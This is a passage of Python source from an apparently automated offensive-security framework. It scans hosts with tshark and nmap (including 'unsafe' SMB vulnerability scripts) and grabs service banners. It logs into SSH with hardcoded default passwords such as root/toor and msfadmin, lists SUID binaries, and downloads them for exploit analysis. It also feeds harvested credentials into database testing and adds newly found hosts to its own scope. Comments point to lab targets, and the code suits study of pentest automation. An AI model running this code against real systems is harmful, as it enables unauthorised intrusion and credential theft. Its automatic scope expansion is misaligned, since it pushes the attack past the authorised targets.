    SSH banners (HO-02), Kerberos AS-REP (AD-08), Docker API (CE-04),
    JNDI in HTTP (AP-L8), unusual outbound ports (AP-L7), etc.

    Running synchronously means gravity waits 30s but the entropy delta
    after the call is accurate — non-blocking would always read zero change.
    """
    events_file = out_dir / f"gravity_pcap_{ip}_{run_id[:8]}.ndjson"
    duration = 30

    print(f"    [PCAP] Capturing traffic to/from {ip} for {duration}s...")

    try:
        proc = subprocess.run(
            ["tshark", "-i", "any", "-f", f"host {ip}",
             "-a", f"duration:{duration}",
             "-T", "fields",
             "-e", "ip.src", "-e", "ip.dst",
             "-e", "tcp.dstport", "-e", "tcp.srcport",
             "-e", "udp.dstport", "-e", "udp.srcport",
             "-e", "ssh.protocol", "-e", "kerberos.msg_type",
             "-e", "http.request.uri", "-e", "dns.qry.name",
             "-e", "_ws.col.Protocol",
             "-E", "separator=|", "-E", "occurrence=f"],
            capture_output=True, text=True, timeout=duration + 15,
        )
        raw_output = proc.stdout
    except subprocess.TimeoutExpired:
        result["error"] = "tshark timed out"
        return result
    except FileNotFoundError:
        result["error"] = "tshark not found — install: pacman -S wireshark-cli"
        return result
    except Exception as exc:
        result["error"] = f"tshark error: {exc}"
        return result

    if not raw_output.strip():
        result["success"] = True
        result["flows"] = 0
        print(f"    [PCAP] No passive traffic — probing {ip} with TCP banner grabs...")
        # Active fallback: probe ports to generate traffic, then check for cleartext creds
        # Use a short tshark capture while actively connecting to common ports
        _probe_ports = [21, 22, 23, 25, 80, 110, 143, 389, 443, 445, 5985]
        probe_output_lines = []
        for _pp in _probe_ports:
            try:
                import socket as _sock
                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect((ip, _pp))
                try:
                    banner_bytes = s.recv(512)
                    banner_text = banner_bytes.decode("utf-8", errors="replace").strip()[:120]
                    if banner_text:
                        probe_output_lines.append(f"port {_pp}: {banner_text}")
                except Exception:
                    probe_output_lines.append(f"port {_pp}: open (no banner)")
                s.close()
            except (ConnectionRefusedError, OSError, Exception):
                pass

        if probe_output_lines:
            _banner_events = []
            now_ts = iso_now()
            for _line in probe_output_lines:
                _port_match = re.match(r"port (\d+): (.+)", _line)
                if not _port_match:
                    continue
                _port, _banner = int(_port_match.group(1)), _port_match.group(2)
                # Map banner port to wicket
                _wid = {21: "HO-01", 22: "HO-02", 23: "HO-01", 25: "HO-01",
                        80: "WB-01", 110: "HO-01", 143: "HO-01",
                        389: "AD-01", 445: "HO-19", 5985: "HO-02"}.get(_port, "HO-01")
                _ev = _gravity_precondition_event(
                    source_id="pcap_probe",
                    toolchain="pcap",
                    wicket_id=_wid,
                    status="realized",
                    workload_id=f"host::{ip}",
                    target_ip=ip,
                    detail=f"TCP probe port {_port} — banner: {_banner}",
                    evidence_rank=3,
                    source_kind="tcp_banner_grab",
                    pointer=f"tcp://{ip}:{_port}",
                    confidence=0.85,
                    run_id=run_id,
                    version="0",
                    ts=now_ts,
                )
                _banner_events.append(_ev)

            if _banner_events:
                with open(events_file, "w") as fh:
                    for ev in _banner_events:
                        fh.write(json.dumps(ev) + "\n")
                result["events"] = len(_banner_events)
                result["events_file"] = str(events_file)
                _project_gravity_events(events_file, run_id, result)
                print(f"    [PCAP] Banner grab: {len(_banner_events)} services discovered")
                for _l in probe_output_lines:
                    print(f"      {_l}")
        return result

    try:
        from skg.sensors.net_sensor import _parse_tshark_fields, _flows_to_events
        flows  = _parse_tshark_fields(raw_output)
        events = _flows_to_events(flows, seen_flows=set())
        if events:
            with open(events_file, "w") as fh:
                for ev in events:
                    # Stamp target_ip so the IP filter in _load_events_file matches
                    ev.setdefault("payload", {})["target_ip"] = ip
                    fh.write(json.dumps(ev) + "\n")
        result["success"]      = True
        result["flows"]        = len(flows)
        result["events"]       = len(events)
        result["events_file"]  = str(events_file)
        _project_gravity_events(events_file, run_id, result)
        print(f"    [PCAP] {ip}: {len(flows)} flows → {len(events)} wicket events")
    except Exception as exc:
        result["success"] = True          # capture worked even if parse failed
        result["parse_error"] = str(exc)
        print(f"    [PCAP] capture done, parse error: {exc}")

    return result


def _strip_url_scheme(addr: str) -> str:
    """Strip http:// or https:// from an address so it can be used as a nmap/ssh target."""
    if "://" in addr:
        try:
            from urllib.parse import urlparse as _up
            parsed = _up(addr)
            host = parsed.hostname or addr
            return host
        except Exception:
            pass
    return addr


def _exec_nmap(ip, target, run_id, out_dir, result):
    """
    Run nmap version detection and emit wicket events from the results.

    Parses nmap XML output into obs.attack.precondition events:
      - Open ports    → HO-01 (reachable), HO-02 (SSH), WB-01 (web), CE-04 (Docker)
      - Service banner → WB-02 (version disclosed, feeds NVD)
      - NSE script hits → HO-06, HO-07, HO-11 (vuln indicators)

    Writes events to DISCOVERY_DIR so load_wicket_states reads them.
    """
    import xml.etree.ElementTree as ET

    # Nmap only accepts hostnames/IPs — strip any URL scheme (http://, https://)
    ip = _strip_url_scheme(ip)

    xml_file    = out_dir / f"nmap_{ip}_{run_id[:8]}.xml"
    events_file = out_dir / f"gravity_nmap_{ip}_{run_id[:8]}.ndjson"

    known_ports = [str(svc["port"]) for svc in target.get("services", [])]
    first_contact = not bool(glob.glob(str(out_dir / f"gravity_nmap_{ip}_*.ndjson")))

    # Build port list:
    # - First contact (no prior scan): top-1000 ports so we don't miss anything
    # - Follow-on: known ports + standard service ports for complete coverage
    _COMMON_PORTS = [
        21, 22, 23, 25, 53, 80, 88, 110, 111, 135, 139, 143, 389, 443, 445,
        464, 465, 587, 636, 993, 995, 1433, 1521, 2375, 2376, 3268, 3269,
        3306, 3389, 5432, 5433, 5601, 5985, 5986, 6379, 6443, 8080, 8082,
        8443, 8888, 9200, 9300, 10250, 11211, 11434, 27017,
    ]
    # Always include any ports declared in targets.yaml/surface so we never
    # miss a non-standard service port (e.g. bWAPP on :8082)
    declared_ports = set(int(p) for p in known_ports if str(p).isdigit())

    if first_contact:
        # First contact: common service ports + any declared ports from targets.yaml.
        # Note: --top-ports and -p conflict in nmap (the -p argument overrides
        # --top-ports).  Use an explicit port list instead so declared ports are
        # always included and we know exactly what gets scanned.
        all_first_ports = set(_COMMON_PORTS) | declared_ports
        port_str = ",".join(str(p) for p in sorted(all_first_ports))
        nmap_port_args = ["-p", port_str]
        scan_label = f"first-contact ({len(all_first_ports)} ports{' + ' + str(len(declared_ports)) + ' declared' if declared_ports else ''})"
    else:
        # Follow-on: union of known + all common service ports
        all_ports = declared_ports | set(_COMMON_PORTS)
        port_str = ",".join(str(p) for p in sorted(all_ports))
        nmap_port_args = ["-p", port_str]
        scan_label = f"{len(all_ports)} ports"

    # Scripts — aggressive discovery on first contact, targeted on follow-on
    base_scripts = (
        "default,banner,vulners,"
        "smb-vuln-ms17-010,smb-vuln-ms10-054,smb-os-discovery,"
        "rdp-vuln-ms12-020,rdp-enum-encryption,"
        "http-title,http-server-header,http-methods,"
        "ssl-cert,ftp-anon,ftp-bounce,"
        "ssh-auth-methods,"
        "mysql-info,ms-sql-info,ms-sql-empty-password,"
        "ldap-rootdse"
    )

    print(f"    [NMAP] Scanning {ip} ({scan_label}) with version detection + scripts...")

    def _scan_output_summary(proc: subprocess.CompletedProcess) -> str:
        stderr = (proc.stderr or "").strip()
        stdout = (proc.stdout or "").strip()
        detail = stderr or stdout or "no scan output"
        detail = " ".join(detail.split())
        return detail[:220]

    # Use -sT (TCP connect) rather than -sS (SYN) so Docker-NAT port mappings
    # are visible. SYN scan bypasses the kernel's conntrack/DNAT chain and
    # sees NAT-forwarded ports as filtered even when they are open.
    # -O: OS detection. -A: OS+version+scripts+traceroute. -T4: fast timing.
    # --script-args=unsafe=1: allows SMB vuln scripts (ms17-010 etc) to probe.
    # Loopback (127.x) and local gateway addresses don't need vuln scripts or
    # OS detection — they're always reachable and services are already known.
    # Vuln/vulners scripts make external API calls which can be very slow.
    _is_loopback = ip.startswith("127.") or ip == "::1" or ip.lower() == "localhost"
    vuln_script_args = "unsafe=1"
    if _is_loopback:
        # Fast scan: no vuln category (external API calls), no OS detection
        full_scripts = base_scripts
        nmap_cmd = ["nmap", "-n", "-Pn", "-sT", "-sV", "-T5",
                    f"--script={full_scripts}",
                    f"--script-args={vuln_script_args}",
                    *nmap_port_args,
                    "-oX", str(xml_file), "--open", ip]
    else:
        full_scripts = base_scripts + ",vuln"
        nmap_cmd = ["nmap", "-n", "-Pn", "-sT", "-sV", "-O", "-T4",
                    f"--script={full_scripts}",
                    f"--script-args={vuln_script_args}",
                    *nmap_port_args,
                    "-oX", str(xml_file), "--open", ip]
    try:
        scan = subprocess.run(
            nmap_cmd,
            capture_output=True, text=True, timeout=120
        )
    except subprocess.TimeoutExpired as exc:
        if xml_file.exists() and xml_file.stat().st_size > 2000:
            scan = subprocess.CompletedProcess(
                exc.cmd or [],
                returncode=124,
                stdout=exc.stdout or "",
                stderr=exc.stderr or "",
            )
        else:
            result["error"] = "nmap timed out with no XML output"
            return result
    except FileNotFoundError:
        result["error"] = "nmap not found — install: pacman -S nmap"
        return result
    except Exception as exc:
        result["error"] = str(exc)
        return result

    if not xml_file.exists():
        result["error"] = "nmap produced no output"
        return result

    # Parse XML and emit events
    events = []
    now = iso_now()

    def _ev(wicket_id, status, rank, confidence, detail):
        return _gravity_precondition_event(
            source_id="nmap",
            toolchain="skg-host-toolchain",
            wicket_id=wicket_id,
            status=status,
            workload_id=f"host::{ip}",
            target_ip=ip,
            detail=detail,
            evidence_rank=rank,
            source_kind="nmap_scan",
            pointer=f"nmap://{ip}",
            confidence=confidence,
            run_id=run_id,
            version="0",
            ts=now,
        )

    try:
        tree = ET.parse(xml_file)
        root = tree.getroot()
        host_el = root.find("host")
        if host_el is None:
            # Host is up (per runstats) but no open ports found in scanned range.
            # Emit a reachability event if host was confirmed up, then return.
            _runstats = root.find("runstats/hosts")
            _hosts_up = int((_runstats.get("up") or "0") if _runstats is not None else "0")
            if _hosts_up > 0:
                events.append(_ev("HO-01", "realized", 3, 0.7,
                                  f"Host up (nmap confirms reachability; no open ports in scanned range)"))
                with open(events_file, "w") as fh:
                    for ev in events:
                        fh.write(json.dumps(ev) + "\n")
                result["success"] = True
                result["events_written"] = len(events)
                result["detail"] = f"nmap: host up, no open ports in scanned range"
            else:
                result["error"] = f"nmap: {_scan_output_summary(scan)}"
            return result
        status_el = host_el.find("status")
        if status_el is not None and status_el.get("state") not in (None, "up"):
            result["error"] = f"nmap: host state={status_el.get('state')}"
            return result

        # Host is up → HO-01
        events.append(_ev("HO-01", "realized", 4, 0.95,
                          f"Host responded to nmap scan"))

        for port_el in host_el.findall(".//port"):
            portid   = port_el.get("portid", "")
            state_el = port_el.find("state")
            svc_el   = port_el.find("service")

            if state_el is None or state_el.get("state") != "open":
                continue

            svc_name    = svc_el.get("name", "") if svc_el is not None else ""
            product     = svc_el.get("product", "") if svc_el is not None else ""
            version_str = svc_el.get("version", "") if svc_el is not None else ""
            banner = f"{product} {version_str}".strip() if (product or version_str) else svc_name

            # ── Port-specific wickets ──────────────────────────────────────
            # SSH
            if portid in ("22", "2222") or "ssh" in svc_name:
                events.append(_ev("HO-02", "realized", 4, 0.95,
                                  f"SSH on port {portid}" + (f" — {banner}" if banner else "")))

            # Web services
            if portid in ("80", "443", "8080", "8443", "8000", "8008", "8009") or \
               any(x in svc_name for x in ("http","https")):
                events.append(_ev("WB-01", "realized", 4, 0.90,
                                  f"Web service on port {portid}" + (f" — {banner}" if banner else "")))
                events.append(_ev("HO-01", "realized", 4, 0.95, f"Host reachable (web:{portid})"))

            # SMB
            if portid in ("139", "445") or "smb" in svc_name or "netbios" in svc_name \
               or "microsoft-ds" in svc_name:
                events.append(_ev("HO-19", "realized", 4, 0.95,
                                  f"SMB service on port {portid}" + (f" — {banner}" if banner else "")))
                events.append(_ev("AD-16", "unknown", 4, 0.50,
                                  f"SMB on {portid} — signing/version unknown"))

            # RDP
            if portid == "3389" or "rdp" in svc_name or "ms-wbt" in svc_name:
                events.append(_ev("HO-20", "realized", 4, 0.95,
                                  f"RDP on port {portid}" + (f" — {banner}" if banner else "")))

            # LDAP / AD
            if portid in ("389", "636", "3268", "3269") or "ldap" in svc_name:
                events.append(_ev("AD-01", "realized", 4, 0.90,
                                  f"LDAP/AD service on port {portid}"))

            # Kerberos
            if portid == "88" or "kerberos" in svc_name or "krb5" in svc_name:
                events.append(_ev("AD-01", "realized", 4, 0.95,
                                  f"Kerberos on port {portid} — domain controller likely present"))

            # WinRM
            if portid in ("5985", "5986") or "wsman" in svc_name or "winrm" in svc_name:
                events.append(_ev("HO-04", "realized", 4, 0.90,
                                  f"WinRM on port {portid} — remote shell vector"))

            # FTP
            if portid == "21" or "ftp" in svc_name:
                events.append(_ev("HO-01", "realized", 4, 0.90,
                                  f"FTP on port {portid}" + (f" — {banner}" if banner else "")))

            # Databases
            if portid in ("3306",) or any(x in svc_name for x in ("mysql","mariadb")):
                events.append(_ev("DP-01", "realized", 4, 0.90,
                                  f"MySQL on port {portid}" + (f" — {banner}" if banner else "")))
            if portid in ("5432", "5433") or "postgres" in svc_name:
                events.append(_ev("DP-01", "realized", 4, 0.90,
                                  f"PostgreSQL on port {portid}" + (f" — {banner}" if banner else "")))
            if portid == "1433" or "mssql" in svc_name or "ms-sql" in svc_name:
                events.append(_ev("DP-01", "realized", 4, 0.90,
                                  f"MSSQL on port {portid}" + (f" — {banner}" if banner else "")))
            if portid in ("6379",) or "redis" in svc_name:
                events.append(_ev("DP-01", "realized", 4, 0.90,
                                  f"Redis on port {portid}" + (f" — {banner}" if banner else "")))
            if portid in ("27017",) or "mongodb" in svc_name:
                events.append(_ev("DP-01", "realized", 4, 0.90,
                                  f"MongoDB on port {portid}" + (f" — {banner}" if banner else "")))
            if portid in ("9200", "9300") or "elasticsearch" in svc_name:
                events.append(_ev("DP-01", "realized", 4, 0.90,
                                  f"Elasticsearch on port {portid}" + (f" — {banner}" if banner else "")))

            # Docker
            if portid in ("2375", "2376"):
                events.append(_ev("CE-04", "realized", 6, 0.98,
                                  f"Docker API exposed on port {portid} — unauthenticated socket"))
            # Kubernetes
            if portid in ("6443", "10250", "10255"):
                events.append(_ev("CE-01", "realized", 5, 0.90,
                                  f"Kubernetes API/kubelet on port {portid}"))

            # Version disclosure — feeds NVD feed + zero-day detector
            if banner:
                events.append(_ev("WB-02", "realized", 4, 0.85,
                                  json.dumps({svc_name: banner})))

        # NSE script hits — look for vuln indicators
        for script_el in host_el.findall(".//script"):
            script_id  = script_el.get("id", "")
            script_out = script_el.get("output", "")

            if "vuln" in script_id or "CVE" in script_out:
                # Extract CVE IDs if present
                cve_ids = re.findall(r"CVE-\d{4}-\d+", script_out)
                for cve_id in cve_ids:
                    events.append(_ev(cve_id, "realized", 6, 0.75,
                                      f"nmap NSE {script_id}: {script_out[:120]}"))
                # Confirmed-vulnerable NSE scripts → HO-25
                if "VULNERABLE" in script_out or "State: VULNERABLE" in script_out:
                    events.append(_ev("HO-25", "realized", 7, 0.90,
                                      f"nmap NSE {script_id} confirmed VULNERABLE: {script_out[:200]}"))
                elif not cve_ids:
                    events.append(_ev("HO-11", "realized", 5, 0.65,
                                      f"nmap NSE {script_id}: {script_out[:120]}"))

            if "sudo" in script_out.lower() and "NOPASSWD" in script_out:
                events.append(_ev("HO-06", "realized", 5, 0.80,
                                  f"nmap NSE: sudo NOPASSWD detected"))

    except ET.ParseError as exc:
        result["error"] = f"nmap XML parse error: {exc}"
        return result

    # Write events
    if events:
        with open(events_file, "w") as fh:
            for ev in events:
                fh.write(json.dumps(ev) + "\n")

    result["success"]     = True
    result["nmap_xml"]    = str(xml_file)
    result["events"]      = len(events)
    result["events_file"] = str(events_file)
    _project_gravity_events(events_file, run_id, result)
    if scan.returncode != 0:
        result["warning"] = f"nmap exited {scan.returncode}: {_scan_output_summary(scan)}"
    _update_surface_target_record(_latest_surface_path(), ip, _parse_nmap_services(xml_file))
    print(f"    [NMAP] {ip}: {len(events)} wicket events → {events_file.name}")
    if result.get("warning"):
        print(f"      note: {result['warning']}")
    # ── Auto scope expansion ────────────────────────────────────────────────
    # If nmap discovered new hosts (from ARP scan or --script results),
    # register them in the surface automatically.
    try:
        _scope_expand_from_nmap(result.get("events_file", ""), surface_path=None)
    except Exception:
        pass
    return result


def _exec_binary_analysis(ip, target, run_id, out_dir, result):
    """
    Run binary exploitation analysis on binaries found on the target.

    Gravity selects this instrument when BA-* wickets are unknown — typically
    after HO-07 (SUID binary present) or FI-04 (executable in /tmp) fires,
    which propagate intra-target to elevate BA-* priors.

    Process:
      1. Find candidate binaries via SSH (SUID bins, bins in /tmp, service exes)
      2. Fetch each binary to local /tmp via SCP
      3. Run checksec → BA-01/02/03
      4. Run rabin2 -i → BA-04 (dangerous imports)
      5. Run ltrace with crafted input → BA-05 (controlled input reachable)
      6. Run ROPgadget → BA-06 (chain constructible)
      7. Emit events to DISCOVERY_DIR

    Falls back to the exploit_dispatch analyze_binary() function if available.
    """
    import subprocess as _sp
    import shutil as _sh

    # Load SSH credentials
    targets_file = _config_file("targets.yaml")
    ssh_target = None
    if targets_file.exists():
        try:
            import yaml
            data = yaml.safe_load(targets_file.read_text())
            tlist = data if isinstance(data, list) else (data or {}).get("targets", [])
            for t in tlist:
                if t.get("host") == ip or t.get("ip") == ip:
                    ssh_target = t
                    break
        except Exception:
            pass

    workload_id  = f"binary::{ip}"
    attack_path_id = "binary_stack_overflow_v1"
    all_events: list[dict] = []

    # ── Primary path: SSH-based adapter (parse.py) ────────────────────────
    ba_adapter_path = SKG_HOME / "skg-binary-toolchain" / "adapters" / "binary_analysis" / "parse.py"
    if ba_adapter_path.exists() and ssh_target:
        try:
            ba_mod = _load_module_from_file("skg_binary_analysis", ba_adapter_path)
            ssh_user = ssh_target.get("user") or ssh_target.get("username") or "root"
            ssh_pass = ssh_target.get("password") or None
            ssh_key  = ssh_target.get("key") or None
            ssh_port = int(ssh_target.get("ssh_port") or ssh_target.get("port") or 22)
            ba_events = ba_mod.run(
                host=ip, ssh_port=ssh_port, user=ssh_user,
                password=ssh_pass, key=ssh_key,
                workload_id=workload_id, run_id=run_id,
            )
            if ba_events:
                all_events.extend(ba_events)
                ev_file = (Path(out_dir) if out_dir else SKG_STATE_DIR / "gravity") / \
                          f"gravity_binary_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
                ev_file.parent.mkdir(parents=True, exist_ok=True)
                with ev_file.open("w") as fh:
                    for ev in ba_events:
                        fh.write(json.dumps(ev) + "\n")
                r = sum(1 for e in ba_events if e.get("payload", {}).get("status") == "realized")
                b = sum(1 for e in ba_events if e.get("payload", {}).get("status") == "blocked")
                result["success"]     = True
                result["events"]      = len(ba_events)
                result["events_file"] = str(ev_file)
                _project_gravity_events(str(ev_file), run_id, result)
                print(f"    [BIN] {ip}: {len(ba_events)} events (R={r} B={b}) → {ev_file.name}")
                return result
        except Exception as _ba_exc:
            print(f"    [BIN] SSH adapter failed ({_ba_exc}); falling back to exploit_dispatch")

    def _ev(wid, status, rank, conf, detail):
        now_ts = datetime.now(timezone.utc).isoformat()
        return _gravity_precondition_event(
            source_id="gravity.binary_analysis",
            toolchain="skg-binary-toolchain",
            wicket_id=wid,
            status=status,
            workload_id=workload_id,
            target_ip=ip,
            detail=detail[:400],
            evidence_rank=rank,
            source_kind="binary_scanner",
            pointer=f"ssh://{ip}",
            confidence=conf,
            run_id=run_id,
            attack_path_id=attack_path_id,
            domain="binary",
            version="0.1.0",
            ts=now_ts,
            extra_payload={"observed_at": now_ts},
        )

    def _ssh_attempts():
        seen = set()
        attempts = []

        def _add(user, key=None, password=None, label=""):
            entry = (user or "", key or "", password or "")
            if entry in seen:
                return
            seen.add(entry)
            attempts.append({
                "username": user or "root",
                "key_filename": str(Path(key).expanduser()) if key else None,
                "password": password,
                "port": int((ssh_target or {}).get("port", 22) or 22),
                "label": label or (user or "root"),
            })

        if ssh_target:
            _add(
                ssh_target.get("user") or ssh_target.get("username") or "root",
                ssh_target.get("key"),
                ssh_target.get("password"),
                "targets.yaml",
            )

        for user, password in [
            ("msfadmin", "msfadmin"),
            ("user", "user"),
            ("root", "toor"),
            ("root", "root"),
            ("admin", "admin"),
        ]:
            _add(user, None, password, "lab-default")
        _add("root", None, None, "agent")
        return attempts

    def _connect_binary_ssh():
        try:
            import paramiko
        except ImportError as exc:
            return None, exc, []

        attempts = _ssh_attempts()
        last_exc = None
        for attempt in attempts:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                kwargs = {
                    "hostname": ip,
                    "port": attempt["port"],
                    "username": attempt["username"],
                    "timeout": 15,
                    "allow_agent": True,
                    "look_for_keys": True,
                }
                if attempt.get("key_filename"):
                    kwargs["key_filename"] = attempt["key_filename"]
                    kwargs["allow_agent"] = False
                    kwargs["look_for_keys"] = False
                elif attempt.get("password") is not None:
                    kwargs["password"] = os.path.expandvars(attempt["password"])
                    kwargs["allow_agent"] = False
                    kwargs["look_for_keys"] = False
                client.connect(**kwargs)
                return client, None, attempts
            except Exception as exc:
                last_exc = exc
                try:
                    client.close()
                except Exception:
                    pass
        return None, last_exc, attempts

    # Step 1: find candidate binaries via SSH
    candidate_binaries: list[str] = []

    ssh_attempts = []
    if ssh_target or ip.startswith(("172.17.", "172.18.", "192.168.")):
        try:
            client, ssh_exc, ssh_attempts = _connect_binary_ssh()
            if client is None:
                raise ssh_exc or RuntimeError("binary SSH connection failed")

            # SUID binaries (already partially known from HO-07)
            _, stdout, _ = client.exec_command(
                "find / -perm -4000 -type f 2>/dev/null "
                "| grep -v '^/proc\\|^/sys' | head -10", timeout=30)
            candidate_binaries += [l.strip() for l in
                                    stdout.read().decode(errors="replace").splitlines()
                                    if l.strip()]

            # Executables in /tmp
            _, stdout2, _ = client.exec_command(
                "find /tmp /var/tmp -type f -executable 2>/dev/null | head -5",
                timeout=10)
            candidate_binaries += [l.strip() for l in
                                    stdout2.read().decode(errors="replace").splitlines()
                                    if l.strip()]
            client.close()
        except Exception as exc:
            print(f"    [BIN] SSH failed for {ip}: {exc}")
            if ssh_attempts:
                print("    [BIN] Tried: " + ", ".join(
                    f"{a['username']}[{a['label']}]" for a in ssh_attempts[:6]
                ))

    # Step 2: Use exploit_dispatch analyze_binary if available (skips remote fetch)
    dispatch_path = SKG_HOME / "skg-gravity" / "exploit_dispatch.py"
    if dispatch_path.exists():
        try:
            sys.path.insert(0, str(dispatch_path.parent))
            from exploit_dispatch import analyze_binary

            # For remote binaries, we need to fetch them first
            # For now emit one pass on any locally accessible path
            fetched_any = False
            for remote_path in candidate_binaries[:3]:
                local_tmp = Path(f"/tmp/skg_bin_{run_id[:8]}_{Path(remote_path).name}")
                try:
                    if candidate_binaries:
                        t, ssh_exc, _ = _connect_binary_ssh()
                        if t is None:
                            raise ssh_exc or RuntimeError("binary fetch SSH connection failed")
                        sftp = t.open_sftp()
                        sftp.get(remote_path, str(local_tmp))
                        sftp.close()
                        t.close()

                    if local_tmp.exists():
                        print(f"    [BIN] Analyzing {remote_path}...")
                        evs = analyze_binary(str(local_tmp))
                        # Stamp target_ip
                        for ev in evs:
                            ev.setdefault("payload", {})["target_ip"] = ip
                            ev["payload"]["workload_id"] = workload_id
                        all_events.extend(evs)
                        fetched_any = True
                        local_tmp.unlink(missing_ok=True)
                except Exception:
                    pass

            if not fetched_any and not candidate_binaries:
                # No binaries found — emit unknowns for all BA-* wickets
                for wid in ["BA-01","BA-02","BA-03","BA-04","BA-05","BA-06"]:
                    all_events.append(_ev(wid, "unknown", 6, 0.40,
                                         "No candidate binaries found on target"))
        except ImportError:
            pass

    if not all_events:
        # No analysis ran — emit unknowns
        for wid in ["BA-01","BA-02","BA-03","BA-04","BA-05","BA-06"]:
            all_events.append(_ev(wid, "unknown", 6, 0.40,
                                  "Binary analysis tools not available "
                                  "(install: checksec rabin2 ROPgadget)"))
        result["success"] = False
        result["action"]  = "operator"
        result["suggestion"] = (
            f"Provide SSH creds or fetch a binary locally, then: "
            f"skg exploit binary /path/to/suid_binary"
        )

    if all_events:
        ev_file = out_dir / f"gravity_binary_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
        with open(ev_file, "w") as fh:
            for ev in all_events:
                fh.write(json.dumps(ev) + "\n")
        r = sum(1 for e in all_events if e["payload"]["status"] == "realized")
        b = sum(1 for e in all_events if e["payload"]["status"] == "blocked")
        u = sum(1 for e in all_events if e["payload"]["status"] == "unknown")
        print(f"    [BIN] {ip}: {len(all_events)} BA-* events ({r}R {b}B {u}U)")
        result["success"]     = True
        result["events"]      = len(all_events)
        result["events_file"] = str(ev_file)
        try:
            EVENTS_DIR.mkdir(parents=True, exist_ok=True)
            (EVENTS_DIR / ev_file.name).write_text(ev_file.read_text())
        except Exception:
            pass
        _project_gravity_events(ev_file, run_id, result)

    return result


def _exec_toolchain_adapter(
    adapter_name: str,
    module_key: str,
    adapter_subpath: str,
    attack_path_id: str,
    label: str,
    ip: str,
    target: dict,
    run_id: str,
    out_dir,
    result: dict,
    *,
    authorized: bool = False,
) -> dict:
    """
    Generic SSH-based toolchain adapter runner.  Loads parse.py from
    skg-binary-toolchain/adapters/<adapter_subpath>, calls run(), writes NDJSON,
    projects events.  Used by capa_analysis, angr_symbolic, and frida_trace.
    """
    ssh_target = None
    for t in (target if isinstance(target, list) else [target]):
        if isinstance(t, dict) and (t.get("ssh_port") or t.get("user") or t.get("username")):
            ssh_target = t
            break
    if ssh_target is None and isinstance(target, dict):
        ssh_target = target

    if not ssh_target:
        result.setdefault("error", f"{label}: no SSH target")
        return result

    adapter_path = SKG_HOME / "skg-binary-toolchain" / "adapters" / adapter_subpath / "parse.py"
    if not adapter_path.exists():
        result.setdefault("error", f"{label}: adapter not found at {adapter_path}")
        return result

    try:
        mod = _load_module_from_file(module_key, adapter_path)
        ssh_user = ssh_target.get("user") or ssh_target.get("username") or "root"
        ssh_pass = ssh_target.get("password") or None
        ssh_key  = ssh_target.get("key") or None
        ssh_port = int(ssh_target.get("ssh_port") or ssh_target.get("port") or 22)

        run_kwargs: dict = dict(
            host=ip, ssh_port=ssh_port, user=ssh_user,
            password=ssh_pass, key=ssh_key,
            workload_id=f"binary::{ip}", run_id=run_id,
            attack_path_id=attack_path_id,
        )
        if authorized:
            run_kwargs["authorized"] = True

        events = mod.run(**run_kwargs)
        if not events:
            return result

        ev_file = (Path(out_dir) if out_dir else SKG_STATE_DIR / "gravity") / \
                  f"gravity_{adapter_name}_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
        ev_file.parent.mkdir(parents=True, exist_ok=True)
        with ev_file.open("w") as fh:
            for ev in events:
                fh.write(json.dumps(ev) + "\n")

        r = sum(1 for e in events if e.get("payload", {}).get("status") == "realized")
        b = sum(1 for e in events if e.get("payload", {}).get("status") == "blocked")
        result["success"]     = True
        result["events"]      = len(events)
        result["events_file"] = str(ev_file)
        _project_gravity_events(str(ev_file), run_id, result)
        print(f"    [{label}] {ip}: {len(events)} events (R={r} B={b}) → {ev_file.name}")

    except Exception as exc:
        result.setdefault("error", f"{label}: {exc!s:.200}")
        print(f"    [{label}] {ip}: failed — {exc}")

    return result


def _exec_capa_analysis(ip, target, run_id, out_dir, result):
    """Binary capability + ATT&CK technique detection via capa (BA-07, BA-08)."""
    return _exec_toolchain_adapter(
        "capa", "skg_capa_analysis", "capa_analysis",
        "binary_offensive_capability_v1", "CAPA",
        ip, target, run_id, out_dir, result,
    )


def _exec_angr_symbolic(ip, target, run_id, out_dir, result):
    """angr symbolic execution confirmation of dangerous call reachability (BA-09)."""
    return _exec_toolchain_adapter(
        "angr", "skg_angr_symbolic", "angr_symbolic",
        "binary_symbolic_confirmed_v1", "ANGR",
        ip, target, run_id, out_dir, result,
    )


def _exec_frida_trace(ip, target, run_id, out_dir, result, authorized=False):
    """Frida runtime hook interception of dangerous calls (BA-10). Requires authorized=True."""
    return _exec_toolchain_adapter(
        "frida", "skg_frida_trace", "frida_trace",
        "binary_runtime_confirmed_v1", "FRIDA",
        ip, target, run_id, out_dir, result,
        authorized=authorized,
    )


def _exec_db_discovery(ip, target, run_id, out_dir, result):
    """
    SSH-based database service discovery and exposure assessment.

    Finds DB services listening on the target (MySQL, PG, MongoDB, Redis),
    tests default credentials and harvested creds from HO-18, checks bind
    address and auth config, and emits DE-* wicket events.

    Does not require pre-configured data_sources.yaml — discovery is fully
    autonomous via SSH.
    """
    db_discovery_path = SKG_HOME / "skg-data-toolchain" / "adapters" / "db_discovery" / "parse.py"
    if not db_discovery_path.exists():
        result["error"] = "db_discovery adapter not found"
        return result

    # Load SSH credentials for this target
    targets_file = _config_file("targets.yaml")
    ssh_target = None
    if targets_file.exists():
        try:
            import yaml as _y
            tcfg = _y.safe_load(targets_file.read_text()) or {}
            tlist = tcfg if isinstance(tcfg, list) else tcfg.get("targets", [])
            for t in tlist:
                if t.get("host") == ip or t.get("ip") == ip:
                    ssh_target = t
                    break
        except Exception:
            pass

    if not ssh_target:
        # Fall back to target dict passed in
        ssh_target = target if isinstance(target, dict) else {}

    ssh_user     = ssh_target.get("user") or ssh_target.get("username") or "root"
    ssh_password = ssh_target.get("password") or None
    ssh_key      = ssh_target.get("key") or ssh_target.get("key_file") or None
    ssh_port     = int(ssh_target.get("ssh_port") or ssh_target.get("port") or 22)
    workload_id  = ssh_target.get("workload_id") or f"db::{ip}"

    # Collect harvested credentials from the SKG state store (HO-18)
    harvested: list[dict] = []
    try:
        states = load_wicket_states(ip)
        ho18 = states.get("HO-18") or {}
        raw_creds = ho18.get("detail", "") or ""
        # detail field often contains JSON list or "user:pass" lines
        import json as _json
        try:
            cand = _json.loads(raw_creds)
            if isinstance(cand, list):
                harvested = [c for c in cand if isinstance(c, dict)]
        except Exception:
            for line in raw_creds.splitlines():
                if ":" in line:
